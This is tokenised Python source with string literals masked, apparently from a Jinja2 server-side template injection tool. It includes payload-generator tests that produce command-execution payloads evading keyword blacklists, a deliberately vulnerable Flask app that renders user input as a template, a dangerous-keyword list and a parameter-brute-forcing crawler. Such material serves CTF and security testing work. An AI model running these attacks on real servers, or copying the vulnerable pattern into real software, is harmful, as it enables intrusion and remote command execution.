<EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> self . full_payload_gen = get_full_payload_gen ( self . blacklist ) <EOL> class FullPayloadGenTestCaseSubs ( FullPayloadGenTestCaseSimple ) : <EOL> def setUp ( self ) -> None : <EOL> super ( ) . setUp ( ) <EOL> self . blacklist = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> self . full_payload_gen = get_full_payload_gen ( self . blacklist ) <EOL> class FullPayloadGenTestCaseMul ( FullPayloadGenTestCaseSimple ) : <EOL> def setUp ( self ) -> None : <EOL> super ( ) . setUp ( ) <EOL> self . blacklist = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> self . full_payload_gen = get_full_payload_gen ( self . blacklist ) <EOL> class FullPayloadGenTestCaseRandom ( FullPayloadGenTestCaseSimple ) : <EOL> def setUp ( self ) -> None : <EOL> super ( ) . setUp ( ) <EOL> self . blacklists = [ <EOL> random . sample ( <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] , <EOL> k = <NUM_LIT> , <EOL> ) <EOL> for _ in range ( <NUM_LIT> ) <EOL> ] <EOL> self . full_payload_gens = [ <EOL> get_full_payload_gen ( <EOL> blacklist , <EOL> detect_mode = random . choice ( <EOL> [ <EOL> fenjing . const . DetectMode . ACCURATE , <EOL> fenjing . const . DetectMode . FAST , <EOL> ] <EOL> ) , <EOL> environment = fenjing . const . TemplateEnvironment . JINJA2 , <EOL> ) <EOL> for blacklist in self . blacklists <EOL> ] <EOL> def test_os_popen_read ( self ) : <EOL> for full_payload_gen , blacklist in zip ( self . full_payload_gens , self . blacklists ) : <EOL> payload , _ = full_payload_gen . generate ( <EOL> const . OS_POPEN_READ , "<STR_LIT>" <EOL> ) <EOL> assert payload is not None , repr ( blacklist ) <EOL> try : <EOL> result = jinja2 . Template ( payload ) . render ( ) <EOL> except Exception as exc : <EOL> raise RuntimeError ( repr ( blacklist ) ) from exc <EOL> assert "<STR_LIT>" in result , repr ( blacklist ) <EOL> </s>
<s> import random <EOL> from flask import Flask , request , render_template_string <EOL> from jinja2 import Template <EOL> app = Flask ( __name__ ) <EOL> blacklist = [ <EOL> ] <EOL> @ app . route ( "<STR_LIT>" , methods = [ "<STR_LIT>" , "<STR_LIT>" ] ) <EOL> def index ( ) : <EOL> name = request . args . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if any ( w in name for w in blacklist ) : <EOL> return "<STR_LIT>" <EOL> template = <EOL> return render_template_string ( template ) <EOL> if __name__ == "<STR_LIT>" : <EOL> app . run ( host = "<STR_LIT>" , port = <NUM_LIT> ) <EOL> </s>
<s> import platform <EOL> IS_SUPPORTED_PLATFORM = platform . system ( ) != "<STR_LIT>" <EOL> IS_COLORING_ENABLED = False <EOL> def set_enable_coloring ( enable = True ) : <EOL> global IS_COLORING_ENABLED <EOL> IS_COLORING_ENABLED = enable <EOL> def colored ( color , text , bold = False ) : <EOL> if not IS_SUPPORTED_PLATFORM or not IS_COLORING_ENABLED : <EOL> return text <EOL> colors = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> format_str = "<STR_LIT>" <EOL> if bold : <EOL> format_str = "<STR_LIT>" <EOL> if color not in colors : <EOL> color = "<STR_LIT>" <EOL> return format_str . format ( int ( bold ) , colors [ color ] , text ) <EOL> </s>
<s> from typing import Callable , Dict <EOL> from enum import Enum <EOL> from pathlib import Path <EOL> import json <EOL> CURRENT_FOLDER = Path ( __file__ ) . parent <EOL> DEFAULT_USER_AGENT = "<STR_LIT>" <EOL> LITERAL = "<STR_LIT>" <EOL> UNSATISFIED = "<STR_LIT>" <EOL> EXPRESSION = "<STR_LIT>" <EOL> ONEOF = "<STR_LIT>" <EOL> ENCLOSE_UNDER = "<STR_LIT>" <EOL> ENCLOSE = "<STR_LIT>" <EOL> WITH_CONTEXT_VAR = "<STR_LIT>" <EOL> JINJA_CONTEXT_VAR = "<STR_LIT>" <EOL> FLASK_CONTEXT_VAR = "<STR_LIT>" <EOL> REQUIRE_PYTHON3 = "<STR_LIT>" <EOL> PLUS = "<STR_LIT>" <EOL> MULTIPLY = "<STR_LIT>" <EOL> MOD = "<STR_LIT>" <EOL> FUNCTION_CALL = "<STR_LIT>" <EOL> STRING_CONCAT = "<STR_LIT>" <EOL> STRING_CONCATMANY = "<STR_LIT>" <EOL> VARIABLE_OF = "<STR_LIT>" <EOL> ZERO = "<STR_LIT>" <EOL> POSITIVE_INTEGER = "<STR_LIT>" <EOL> INTEGER = "<STR_LIT>" <EOL> STRING_PERCENT = "<STR_LIT>" <EOL> STRING_PERCENT_LOWER_C = "<STR_LIT>" <EOL> STRING_UNDERLINE = "<STR_LIT>" <EOL> STRING_TWOUNDERLINE = "<STR_LIT>" <EOL> STRING_LOWERC = "<STR_LIT>" <EOL> STRING_MANY_PERCENT_LOWER_C = "<STR_LIT>" <EOL> STRING_MANY_FORMAT_C = "<STR_LIT>" <EOL> CHAR = "<STR_LIT>" <EOL> STRING = "<STR_LIT>" <EOL> FORMULAR_SUM = "<STR_LIT>" <EOL> ATTRIBUTE = "<STR_LIT>" <EOL> ITEM = "<STR_LIT>" <EOL> CLASS_ATTRIBUTE = "<STR_LIT>" <EOL> CHAINED_ATTRIBUTE_ITEM = "<STR_LIT>" <EOL> BUILTINS_DICT = "<STR_LIT>" <EOL> IMPORT_FUNC = "<STR_LIT>" <EOL> EVAL_FUNC = "<STR_LIT>" <EOL> EVAL = "<STR_LIT>" <EOL> CONFIG = "<STR_LIT>" <EOL> MODULE_OS = "<STR_LIT>" <EOL> OS_POPEN_OBJ = "<STR_LIT>" <EOL> OS_POPEN_READ = "<STR_LIT>" <EOL> CALLBACK_PREPARE_FULLPAYLOADGEN = "<STR_LIT>" <EOL> CALLBACK_GENERATE_FULLPAYLOAD = "<STR_LIT>" <EOL> CALLBACK_GENERATE_PAYLOAD = "<STR_LIT>" <EOL> CALLBACK_SUBMIT = "<STR_LIT>" <EOL> CALLBACK_TEST_FORM_INPUT = "<STR_LIT>" <EOL> APICODE_OK = <NUM_LIT> <EOL> APICODE_WRONG_INPUT = <NUM_LIT> <EOL> class DetectMode ( Enum ) : <EOL> FAST = "<STR_LIT>" <EOL> ACCURATE = "<STR_LIT>" <EOL> class TemplateEnvironment ( Enum ) : <EOL> FLASK = "<STR_LIT>" <EOL> JINJA2 = "<STR_LIT>" <EOL> class PythonEnvironment ( Enum ) : <EOL> UNKNOWN = "<STR_LIT>" <EOL> PYTHON2 = "<STR_LIT>" <EOL> PYTHON3 = "<STR_LIT>" <EOL> class ReplacedKeywordStrategy ( Enum ) : <EOL> AVOID = "<STR_LIT>" <EOL> IGNORE = "<STR_LIT>" <EOL> DOUBLETAPPING = "<STR_LIT>" <EOL> class AutoFix500Code ( Enum ) : <EOL> ENABLED = "<STR_LIT>" <EOL> DISABLED = "<STR_LIT>" <EOL> WafFunc = Callable [ [ str ] , bool ] <EOL> SET_STMT_PATTERNS = [ <EOL> ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ( "<STR_LIT>" , "<STR_LIT>" ) , <EOL> ] <EOL> DANGEROUS_KEYWORDS = [ <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> UNICODE_INT_CHARCODES = [ <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> ] <EOL> with open ( CURRENT_FOLDER / "<STR_LIT>" , encoding = "<STR_LIT>" ) as f : <EOL> CHAR_PATTERNS : Dict [ str , Dict [ str , str ] ] = json . load ( f ) <EOL> </s>
<s> import logging <EOL> import re <EOL> import random <EOL> import string <EOL> from urllib . parse import urlparse <EOL> from typing import Union , Generator , Tuple , List , Set <EOL> from bs4 import BeautifulSoup <EOL> from . form import get_form , parse_forms , Form <EOL> from . requester import HTTPRequester <EOL> from . colorize import colored <EOL> from . wordlist import HTTP_PARAMS_LIST <EOL> logger = logging . getLogger ( "<STR_LIT>" ) <EOL> PARAM_CHUNK_SIZE = <NUM_LIT> <EOL> PARAM_MAXIMUM_COUNT = <NUM_LIT> <EOL> def parse_urls ( html : Union [ str , BeautifulSoup ] ) -> list : <EOL> if isinstance ( html , str ) : <EOL> bs_obj = BeautifulSoup ( html , "<STR_LIT>" ) <EOL> elif isinstance ( html , BeautifulSoup ) : <EOL> bs_obj = html <EOL> return [ <EOL> element . attrs [ "<STR_LIT>" ] for element in bs_obj . select ( "<STR_LIT>" ) if "<STR_LIT>" in element <EOL> ] <EOL> def burst_respond_params_data ( <EOL> requester : HTTPRequester , url : str , html_str : str <EOL> ) -> Tuple [ List [ str ] , List [ str ] ] : <EOL> words : List [ str ] = ( <EOL> re . findall ( r"<STR_LIT>" , html_str ) <EOL> + re . findall ( r"<STR_LIT>" , html_str ) <EOL> + HTTP_PARAMS_LIST <EOL> ) <EOL> words = list ( set ( words ) ) <EOL> random . shuffle ( words ) <EOL> if len ( words ) > PARAM_CHUNK_SIZE * <NUM_LIT> : <EOL> logger . warning ( "<STR_LIT>" , len ( words ) ) <EOL> return [ ] , [ ] <EOL> logger . warning ( "<STR_LIT>" , len ( words ) ) <EOL> respond_get_params : Set [ str ] = set ( ) <EOL> respond_post_params : Set [ str ] = set ( ) <EOL> for i in range ( <NUM_LIT> , len ( words ) , PARAM_CHUNK_SIZE ) : <EOL> words_chunk = words [ i : i + PARAM_CHUNK_SIZE ] <EOL> for _ in range ( <NUM_LIT> ) : <EOL> params = { <EOL> k : "<STR_LIT>" . join ( random . choices ( string . ascii_lowercase + string . digits , k = <NUM_LIT> ) ) <EOL> for k in words_chunk <EOL> } <EOL> data = { <EOL> k : "<STR_LIT>" . join ( random . choices ( string . ascii_lowercase + string . digits , k = <NUM_LIT> ) ) <EOL> for k in words_chunk <EOL> } <EOL> resp = requester . request ( method = "<STR_LIT>" , url = url , params = params ) <EOL> if resp : <EOL> respond_get_params |= set ( <EOL> k for k , v in params . items ( ) if v in resp . text <EOL> ) <EOL> resp = requester . request ( method = "<STR_LIT>" , url = url , data = data ) <EOL> if resp : <EOL> respond_post_params |= set ( k for k , v in data . items ( ) if v in resp . text ) <EOL> break <EOL> return list ( respond_get_params ) , list ( respond_post_params ) <EOL> def yield_form ( <EOL> requester : HTTPRequester , start_url : str <EOL> ) -> Generator [ Tuple [ str , List [ Form ] ] , None , None ] : <EOL> found = False <EOL> targets = [ <EOL> start_url , <EOL> ] <EOL> visited = set ( ) <EOL> logger . warning ( "<STR_LIT>" ) <EOL> while targets : <EOL> target_url = targets . pop ( <NUM_LIT> ) <EOL> if target_url in visited : <EOL> continue <EOL> visited . add ( target_url ) <EOL> resp = requester . request ( method = "<STR_LIT>" , url = target_url ) <EOL> if resp is None : <EOL> logger . warning ( "<STR_LIT>" , target_url ) <EOL> continue <EOL> html = BeautifulSoup ( resp . text , "<STR_LIT>" ) <EOL> forms = parse_forms ( target_url , html ) <EOL> if forms : <EOL> yield target_url , forms <EOL> found = True <EOL> respond_get_params , respond_post_params = burst_respond_params_data ( <EOL> requester , target_url , resp . text <EOL> ) <EOL> if respond_get_params and len ( respond_get_params ) < PARAM_MAXIMUM_COUNT : <EOL> logger . warning ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , repr ( respond_get_params ) ) , <EOL> ) <EOL> yield target_url , [ <EOL> get_form ( <EOL> action = urlparse ( target_url ) . path , <EOL> inputs = respond_get_params , <EOL> method = "<STR_LIT>" , <EOL> ) <EOL> ] <EOL> found = True <EOL> if respond_post_params and len ( respond_post_params ) < PARAM_MAXIMUM_COUNT : <EOL> logger . warning ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , repr ( respond_post_params ) ) , <EOL> ) <EOL> yield target_url , [ <EOL> get_form ( <EOL> action = urlparse ( target_url ) . path , <EOL> inputs = respond_post_params , <EOL> method = "<STR_LIT>" , <EOL> ) <EOL> ] <EOL> found = True <EOL> targets += parse_urls ( html ) <EOL> if not found : <EOL> logger . warning ( "<STR_LIT>" ) <EOL> </s>
<s> import sys <EOL> sys . path . append ( "<STR_LIT>" ) <EOL> from fenjing . form import get_form <EOL> from fenjing . requester import HTTPRequester <EOL> import unittest <EOL> import fenjing <EOL> from typing import Union <EOL> from fenjing . const import TemplateEnvironment , ReplacedKeywordStrategy <EOL> from fenjing . cracker import Cracker <EOL> from fenjing . options import Options <EOL> from fenjing . submitter import FormSubmitter , PathSubmitter , Submitter , HTTPResponse <EOL> from fenjing import const , waf_func_gen <EOL> import logging <EOL> import os <EOL> VULUNSERVER_ADDR = os . environ . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> SLEEP_INTERVAL = float ( os . environ . get ( "<STR_LIT>" , <NUM_LIT> ) ) <EOL> class WrappedSubmitter ( Submitter ) : <EOL> def __init__ ( self , subm , blacklist ) : <EOL> super ( ) . __init__ ( ) <EOL> self . subm = subm <EOL> self . blacklist = blacklist <EOL> def submit_raw ( self , raw_payload ) : <EOL> if any ( w in raw_payload for w in self . blacklist ) : <EOL> return HTTPResponse ( status_code = <NUM_LIT> , text = "<STR_LIT>" ) <EOL> return self . subm . submit ( raw_payload ) <EOL> class TestBase ( unittest . TestCase ) : <EOL> def setup_local_waf ( self , blacklist ) : <EOL> self . local_blacklist = blacklist <EOL> self . subm = WrappedSubmitter ( <EOL> FormSubmitter ( <EOL> url = VULUNSERVER_ADDR , <EOL> form = get_form ( action = "<STR_LIT>" , inputs = [ "<STR_LIT>" ] , method = "<STR_LIT>" ) , <EOL> target_field = "<STR_LIT>" , <EOL> requester = HTTPRequester ( interval = SLEEP_INTERVAL ) , <EOL> ) , <EOL> self . local_blacklist , <EOL> ) <EOL> def setup_remote_waf ( self , remote_uri ) : <EOL> self . local_blacklist = None <EOL> self . subm = FormSubmitter ( <EOL> url = VULUNSERVER_ADDR , <EOL> form = get_form ( action = remote_uri , inputs = [ "<STR_LIT>" ] , method = "<STR_LIT>" ) , <EOL> target_field = "<STR_LIT>" , <EOL> requester = HTTPRequester ( interval = SLEEP_INTERVAL ) , <EOL> ) <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . cracker_other_opts = { } <EOL> self . setup_local_waf ( [ "<STR_LIT>" ] ) <EOL> def test_waf ( self ) : <EOL> cracker = Cracker ( self . subm , ** self . cracker_other_opts ) <EOL> full_payload_gen = cracker . crack ( ) <EOL> assert full_payload_gen is not None , self . __class__ . __name__ <EOL> payload , will_print = full_payload_gen . generate ( <EOL> const . OS_POPEN_READ , <EOL> "<STR_LIT>" + self . __class__ . __name__ , <EOL> ) <EOL> assert ( <EOL> payload is not None <EOL> ) , self . __class__ . __name__ <EOL> self . assertTrue ( will_print ) <EOL> if self . local_blacklist : <EOL> for w in self . local_blacklist : <EOL> self . assertNotIn ( w , payload ) <EOL> resp = self . subm . submit ( payload ) <EOL> assert resp is not None <EOL> self . assertIn ( '<STR_LIT>' , resp . text , resp . text ) <EOL> class TestEasy ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_local_waf ( <EOL> [ <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> ) <EOL> class TestStringOct ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_local_waf ( <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> ) <EOL> class TestStringHex ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_local_waf ( <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> ) <EOL> class TestStringUnicodeHex ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) <EOL> self . setup_local_waf ( <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> ) <EOL> class TestStringLower1 ( TestBase ) : <EOL> def setUp ( self ) : <EOL> super ( ) . setUp ( ) 